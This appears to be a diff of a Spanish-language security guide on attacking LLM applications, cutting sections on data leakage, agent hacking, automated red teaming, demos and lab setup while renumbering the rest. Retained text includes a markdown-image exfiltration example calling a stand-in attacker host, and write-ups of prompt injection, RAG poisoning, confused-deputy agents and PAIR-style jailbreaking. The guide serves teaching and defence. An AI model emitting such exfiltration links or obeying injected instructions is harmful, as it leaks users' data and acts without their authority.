@@ -110,45 +110,9 @@ La IA como **canal de fuga**: expone lo que sabe, lo que ve y lo que recuerda. U
 | Exfiltración por salida | Enlace o imagen que codifica datos en la URL | `![x](https://atacante.tld/?d=DATOS)` | Bloquear dominios externos en el render |
 | Datos de entrenamiento | Memorización de información sensible | Texto personal reproducido literalmente | Depuración de datos, evaluación de memorización |
 
-### 5.2 Evidencia necesaria según el origen
-
-| Origen | Fallo ilustrativo | Evidencia necesaria |
-|---|---|---|
-| Contexto | Se incluye un documento reservado innecesariamente | Contexto efectivo y respuesta |
-| RAG | Recuperación documental sin filtrar por usuario | Documentos recuperados y ACL |
-| Sesión o caché | Se reutiliza una respuesta entre clientes | Clave de caché y propietario |
-| Herramienta | Un conector consulta con permisos globales | Identidad efectiva de la operación |
-| Registros | Se almacenan secretos sin control de acceso | Política y permisos de los logs |
-| Entrenamiento | Reproducción de un dato previamente incorporado | Evidencia específica; no basta una respuesta plausible |
-
-### 5.3 Exfiltración vía Markdown (patrón)
-
-```
- Inyección indirecta ──► El modelo incluye una imagen Markdown en su respuesta
-                                      │
-                                      ▼
-                       El navegador la carga ──► los datos viajan en la URL
-```
-
-**Defensa:** renderizar Markdown sin cargar recursos remotos, o con lista blanca de dominios.
-
-### 5.4 Caso: cruce entre dos clientes ficticios
-
-`usuario_alfa` solo puede consultar el documento ALFA; `usuario_beta`, el documento BETA. El segundo contiene el marcador `MARCADOR_BETA_4821`, que no es una credencial.
-
-Si el recuperador entrega BETA al contexto de ALFA, ya existe un fallo de aislamiento aunque el modelo no reproduzca el marcador. Si además lo devuelve, se ha observado exposición en la salida.
-
-**Control principal:** autorización por identidad y documento antes de recuperar o entregar contenido. Pedir al modelo que «no revele secretos» no sustituye esta comprobación.
-
-**Matiz:** revelar un prompt de sistema puede exponer lógica interna, pero no implica automáticamente fuga de credenciales. Los secretos no deberían estar en ese prompt.
-
-**Demo:** [`01_inyeccion_indirecta_factura.md`](01_inyeccion_indirecta_factura.md) (ver también la sección 3).
-
-> Impacto normativo: datos personales implican **RGPD** y notificación de brechas en 72 horas.
-
 ---
 
-## 6. Envenenamiento del conocimiento (RAG)
+## 5. Envenenamiento del conocimiento (RAG)
 
 Si el atacante controla **lo que la IA consulta**, controla **lo que la IA responde**, sin tocar el modelo. Conviene distinguir la alteración del entrenamiento, que puede afectar a los parámetros aprendidos, de la manipulación de un corpus RAG, que modifica las fuentes consultadas. Ambas pueden sesgar resultados, pero tienen persistencia y mecanismos diferentes [R4].
 
@@ -161,15 +125,12 @@ Si el atacante controla **lo que la IA consulta**, controla **lo que la IA respo
 | Fuentes web de consulta | SEO malicioso, páginas preparadas | La IA cita contenido controlado por el atacante |
 | Wikis y repositorios internos | Edición no revisada | Procedimientos alterados |
 
-### 6.2 Flujo
-
 ```
  Atacante ──► sube documento ──► Índice vectorial ──► Pregunta del usuario
                                        │                      │
                                        └──► Recupera el documento falso ──► Respuesta incorrecta
 ```
 
-### 6.3 Caso: procedimiento falso en una base documental
 
 La política aprobada de una organización ficticia exige una revisión de cambios. Una nota no aprobada afirma que ya no hace falta. El asistente recupera la nota y la presenta como política vigente.
 
@@ -196,11 +157,9 @@ Material: [política aprobada](demos/documentos/politica_aprobada.md) y [nota no
 
 ---
 
-## 7. Hacking de agentes
+## 6. Hacking de agentes
 
 Un agente no solo responde: **actúa**. Pasamos de "manipular una respuesta" a "provocar una acción". Un agente puede convertir una respuesta en una propuesta de operación. El riesgo aumenta cuando dispone de funciones innecesarias, permisos amplios o autonomía sin límites [R6].
-
-### 7.1 Riesgos
 
 | Riesgo | Descripción | Ejemplo |
 |--------|-------------|---------|
@@ -209,8 +168,6 @@ Un agente no solo responde: **actúa**. Pasamos de "manipular una respuesta" a "
 | Sistemas conectados | Cadena de confianza larga | Agente → API → base de datos |
 | Confused deputy | El agente usa sus privilegios por orden de un tercero | Un correo manda al agente actuar con permisos del usuario |
 | Persistencia | Instrucción guardada en memoria del agente | Efecto en sesiones futuras |
-
-### 7.2 Cadena de ataque típica
 
 ```
  Contenido hostil ──► Agente lo procesa ──► Interpreta la instrucción
@@ -222,51 +179,11 @@ Un agente no solo responde: **actúa**. Pasamos de "manipular una respuesta" a "
                                          Acción real en el sistema
 ```
 
-### 7.3 Caso: un ticket intenta cerrar otro ticket
-
-El usuario pide resumir una incidencia. El texto del ticket ordena cerrar un segundo ticket y atribuye la orden a un supervisor. El agente propone una llamada a `cerrar_ticket`.
-
-| Etapa | Qué se observa | Qué demuestra |
-|---|---|---|
-| Respuesta | «Voy a cerrar el ticket» | Intención expresada; no ejecución |
-| Propuesta | JSON con herramienta y argumentos | Intento de operación |
-| Autorización | El backend permite o bloquea la propuesta | Funcionamiento de la barrera de permisos |
-| Ejecución | Cambio confirmado en el sistema de prueba | Acción efectiva |
-
-En la demo, las herramientas son simuladas: solo se registran propuestas. No hay conexión a correo, shell ni gestores de incidencias.
-
-**Puntos de revisión:** vínculo entre la operación y el encargo original, identidad del usuario, autorización sobre el objeto, validación de argumentos y confirmación cuando proceda. Una instrucción encontrada en un ticket no concede permisos.
-
-El principio es aplicable a asistentes de red: describir una regla de firewall, proponer su modificación y aplicarla son capacidades diferentes.
-
-**Demo:** [`03_agente_herramientas.md`](03_agente_herramientas.md) — escenario de laboratorio con matriz de permisos y puntos de control.
-
-### 7.4 Bastionado
-
-| Control | Objetivo |
-|---------|----------|
-| Privilegio mínimo | Cada herramienta con el menor alcance posible |
-| Aprobación humana | Confirmación en acciones irreversibles o con datos sensibles |
-| Separación lectura/escritura | Un agente que lee contenido externo no debería poder escribir ni enviar |
-| Registro y auditoría | Trazar cada llamada a herramienta |
-| Entorno aislado (sandbox) | Limitar el radio de impacto |
-
 ---
 
-## 8. IA contra IA
+## 7. IA contra IA
 
 La automatización del ataque: un modelo **genera, prueba y adapta** ataques contra otro. Un modelo puede generar variantes de entrada para evaluar otro modelo. PAIR estudia un procedimiento de refinamiento iterativo en el que un modelo atacante utiliza respuestas del modelo objetivo para modificar sus propuestas [R9]. Sus resultados corresponden a los modelos y condiciones del estudio, no a una tasa universal de éxito.
-
-### 8.1 Roles
-
-| Rol | Función |
-|-----|---------|
-| Atacante | Genera variantes de prompts y estrategias |
-| Objetivo | Sistema bajo prueba (modelo, aplicación o agente) |
-| Juez | Evalúa si el ataque tuvo éxito (según criterio definido) |
-| Orquestador | Registra resultados y decide el siguiente intento |
-
-### 8.2 Bucle de red teaming automatizado
 
 ```
  ┌───────────────┐   ataque    ┌───────────────┐
@@ -279,93 +196,7 @@ La automatización del ataque: un modelo **genera, prueba y adapta** ataques con
  └───────────────┘             └───────────────┘
 ```
 
-| Ventaja para el atacante | Contramedida |
-|--------------------------|--------------|
-| Escala y velocidad | Límites de tasa, detección de patrones |
-| Adaptación continua | Evaluación continua propia (red team automatizado defensivo) |
-| Coste bajo | Defensa en profundidad, no depender de un único filtro |
-| Agentes que engañan a otros agentes | No confiar en mensajes entre agentes sin verificar |
-
-**Uso defensivo:** el mismo bucle sirve para **auditar tu propio sistema** antes de que lo haga otro.
-
-### 8.3 Caso A: generador y clasificador
-
-En nuestro ejercicio, el modelo A intenta que el clasificador B incumpla una regla inocua de salida. Se permiten cinco intentos. Una comprobación externa determina si B respondió con una etiqueta válida.
-
-| Componente | Función | Límite del ejercicio |
-|---|---|---|
-| Modelo A | Proponer una entrada adversarial | Una variante por ronda, máximo cinco |
-| Modelo B | Clasificar según la regla fija | Sin herramientas ni acceso a datos privados |
-| Evaluador | Comparar con el conjunto de etiquetas | Regla determinista, sin obedecer el texto evaluado |
-| Registro | Conservar entrada, salida y resultado | No incluir secretos ni conversaciones ajenas |
-
-Un juez basado en otro LLM también puede equivocarse o ser manipulado. Cuando el objetivo es comprobar un formato exacto, una regla de código resulta más verificable.
-
-### 8.4 Caso B: agente que intenta engañar a otro agente
-
-Un agente lector resume un documento que afirma «el supervisor ya aprobó el cambio». Si el agente ejecutor confunde ese resumen con una autorización, el contenido original ha ganado autoridad al pasar de un agente a otro.
-
-La comprobación consiste en preservar origen y nivel de confianza: «un documento afirma que existe aprobación» no equivale a «el sistema de autorizaciones confirma la aprobación».
-
-**Conclusión técnica:** encadenar modelos no crea automáticamente una frontera de seguridad. Cada herramienta debe verificar permisos por su cuenta.
-
-### 8.5 Demo
-
-**Demo:** [`demo/probar_canary.sh`](demo/probar_canary.sh) — lanza las demos contra un modelo local y comprueba si aparece el token canario.
-
----
-
-## 9. Demos y conclusiones
-
-### 9.1 Catálogo de demos
-
-| Demo | Archivo | Qué comprueba |
-|------|---------|---------------|
-| Guía de laboratorio | [`demos/GUIA_DEMOS.md`](demos/GUIA_DEMOS.md) | Guion general, incluida la prueba directa y la encadenada de jailbreak |
-| Informe de disponibilidad | [`demos/documentos/informe_original.md`](demos/documentos/informe_original.md) / [`informe_manipulado.md`](demos/documentos/informe_manipulado.md) | Si el resumen adopta la cifra falsa de una inyección documental |
-| Política y nota no aprobada | [`demos/documentos/politica_aprobada.md`](demos/documentos/politica_aprobada.md) / [`nota_no_aprobada.md`](demos/documentos/nota_no_aprobada.md) | Si el RAG presenta como vigente una fuente no aprobada |
-| 01 · Inyección indirecta | [`01_inyeccion_indirecta_factura.md`](01_inyeccion_indirecta_factura.md) | Si el asistente obedece una instrucción oculta inocua (token canario) |
-| 02 · RAG envenenado | [`02_documento_rag_envenenado.md`](02_documento_rag_envenenado.md) | Si el RAG detecta o prioriza fuentes contradictorias |
-| 03 · Agente con herramientas | [`03_agente_herramientas.md`](03_agente_herramientas.md) | Matriz de permisos y puntos de control de un agente |
-| Script canario | [`demo/probar_canary.sh`](demo/probar_canary.sh) | Lanza las demos contra un modelo local y detecta el canario |
-
-> Las rutas de las demos se conservan tal como figuraban en cada uno de los dos README originales.
-
-### 9.2 Cómo empezar
-
-1. Leer la guía y seleccionar la demo de inyección documental.
-2. Preparar una sesión sin herramientas ni datos reales.
-3. Ejecutar primero el informe original y después el manipulado, en conversaciones independientes.
-4. Registrar respuestas completas, modelo, fecha y condiciones.
-5. Explicar qué se ha observado y qué queda sin demostrar.
-
-Para imponer instrucciones de sistema de forma separada se necesita una interfaz o un entorno de desarrollo que lo permita. Pegar todo en un mensaje de chat sirve como aproximación pedagógica, pero no reproduce la misma jerarquía.
-
-### 9.3 Demo guiada (laboratorio local)
-
-| Paso | Acción | Resultado esperado |
-|------|--------|--------------------|
-| 1 | Levantar un modelo local (Ollama) | Servicio en `127.0.0.1:11434` |
-| 2 | Ejecutar `demo/probar_canary.sh` | Informe por demo: ¿obedeció o no? |
-| 3 | Revisar el caso 01 | Si aparece el canario, el modelo siguió la instrucción oculta |
-| 4 | Revisar el caso 02 | Si cita el procedimiento falso, el RAG no distingue fuentes |
-| 5 | Aplicar el bastionado y repetir | Comparar resultados antes y después |
-
-```bash
-chmod +x demo/probar_canary.sh
-MODELO=llama3.2 ./demo/probar_canary.sh
-```
-
-### 9.4 Cómo evaluar sin exagerar resultados
-
-- Definir el criterio de éxito antes del ensayo.
-- Conservar controles legítimos: rechazar todo no es una solución funcional.
-- Repetir con condiciones documentadas; una única ejecución tiene alcance limitado.
-- Distinguir fallos del modelo, del recuperador, del backend y de la herramienta.
-- Separar respuesta, propuesta y ejecución efectiva.
-- No considerar un intento fallido prueba de invulnerabilidad.
-
-### 9.5 Conclusiones
+### Conclusiones
 
 | # | Conclusión |
 |---|-----------|
@@ -379,25 +210,10 @@ MODELO=llama3.2 ./demo/probar_canary.sh
 
 ---
 
-## 10. Entorno de laboratorio
-
-| Elemento | Recomendación |
-|----------|---------------|
-| Sistema | Kali Linux en máquina virtual aislada |
-| Modelos | Locales con Ollama (no se envían datos a terceros) |
-| Red | Red interna sin salida a Internet para las pruebas |
-| Datos | Sintéticos; nunca datos reales de clientes |
-| Registro | Guardar entradas, salidas y llamadas a herramientas |
-
-```bash
-# Instalación de Ollama y descarga de un modelo de pruebas
-curl -fsSL https://ollama.com/install.sh | sh
-ollama pull llama3.2
-```
 
 ---
 
-## 11. Marcos de referencia
+## Marcos de referencia
 
 | Marco | Enfoque | Enlace |
 |-------|---------|--------|
